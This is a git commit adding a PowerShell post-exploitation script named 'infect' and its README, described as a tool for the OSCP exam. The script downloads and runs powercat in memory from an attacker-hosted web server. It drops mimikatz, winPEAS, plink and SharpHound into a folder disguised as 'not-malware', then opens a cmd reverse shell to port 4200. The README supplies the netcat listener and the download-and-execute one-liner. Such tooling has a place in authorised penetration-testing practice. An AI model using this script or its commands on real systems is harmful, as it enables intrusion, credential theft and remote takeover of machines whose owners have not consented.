78403847ca86a3362e5fda39a809d5b1ab46c38b
raoul <ra0x1duk3@tuta.io>
2022-04-06 11:34:05 -0400

    v0.1.0

--- README.md
+++ README.md
@@ -1,2 +1,32 @@
 # powershell-infect
 A powershell script for the OSCP Exam which sets up a windows reverse shell and automates the download of some useful windows post-exploit and privilege escalation tools.
+
+
+## Usage
+
+1. Change the paths in the script to reflect the locations of the binaries on your attack box
+2. setup a netcat listener at port 4200 (or change the port in the script as well as the following command)
+```
+rlwrap nc -lvnp 4200
+```
+3. Host the script on a web server. Perhaps using
+```
+systemctl start apache2
+```
+and moving the infect.ps1 file to `/var/www/html` if you are on a modern kali system
+4. Upon discovery of RCE in a windows system, execute the following command, replacing your attack box's ip with <RHOST>, and the path of the script on your locally hosted web server
+```
+powershell -c 'IEX (New-Object System.Net.WebClient).DownloadString('http://<RHOST></some/path/infect.ps1>; infect <RHOST>
+```
+
+
+## Features
+This script performs the following actions
+1. checks architecture to determine which binaries to download
+2. downloads powercat to memory
+3. downloads the following to disk in a directory called `.\not-malware` (full path determined by the location of the RCE):
+    - winpeas
+    - mimikatz
+    - plink
+    - sharphound
+4. sends a powercat reverse shell to a local listener at port 4200
---
+++ infect.ps1
@@ -0,0 +1,71 @@
+function infect
+{
+	# first check the system info
+	param(
+	[alias('attackip')][string]$rhost=""
+	)
+
+	$type = systeminfo  | findstr /c:'System Type'
+	
+	# make the directory for our tools
+	mkdir not-malware
+
+# grab the arch
+	$type = $type.substring(28,2)
+	if ($type -eq "64"){
+		# download the x64 versions
+
+		if ($rhost){
+			# powercat
+			$url = 'http://' + $rhost + '/powercat.ps1'	
+			IEX (new-object system.net.webclient).downloadstring($url)
+			# winpeas
+			$url = 'http://' + $rhost + '/windows-privesc/winPEAS.bat'
+			invoke-webrequest -uri $url -outfile '.\not-malware\winpeas.bat'
+			# mimikatz
+			$url = 'http://' + $rhost + '/mimikatz/x64/mimikatz.exe'
+			invoke-webrequest -uri $url -outfile '.\not-malware\mimikatz.exe'
+			# plink
+			$url = 'http://' + $rhost + '/tunneling/plink64.exe'
+			invoke-webrequest -uri $url -outfile '.\not-malware\plink.exe'
+			# sharphound
+			$url = 'http://' + $rhost + '/BloodHound/Collectors/SharpHound.exe'
+			invoke-webrequest -uri $url -outfile '.\not-malware\sharphound.exe'
+
+			# rev shell
+			powercat -c $rhost -p 4200 -e cmd
+		}
+		else {
+			Write-Output 'error: no ip given'
+		}
+	}
+	if ($type -eq "86"){
+		if ($rhost){
+			# powercat
+			$url = 'http://' + $rhost + '/powercat.ps1'	
+			IEX (new-object system.net.webclient).downloadstring($url)
+			# winpeas
+			$url = 'http://' + $rhost + '/windows-privesc/winPEAS.bat'
+			invoke-webrequest -uri $url -outfile 'winpeas.bat'
+			# mimikatz
+			$url = 'http://' + $rhost + '/mimikatz/Win32/mimikatz.exe'
+			invoke-webrequest -uri $url -outfile 'mimikatz.exe'
+			# plink
+			$url = 'http://' + $rhost + '/tunneling/plink32.exe'
+			invoke-webrequest -uri $url -outfile 'plink.exe'
+			# sharphound
+			$url = 'http://' + $rhost + '/BloodHound/Collectors/SharpHound.exe'
+			invoke-webrequest -uri $url -outfile 'sharphound.exe'
+
+			# rev shell
+			powercat -c $rhost -p 4200 -e cmd
+		}
+		else {
+			Write-Output 'error: no ip given'
+		}
+
+	}
+
+}
+
+
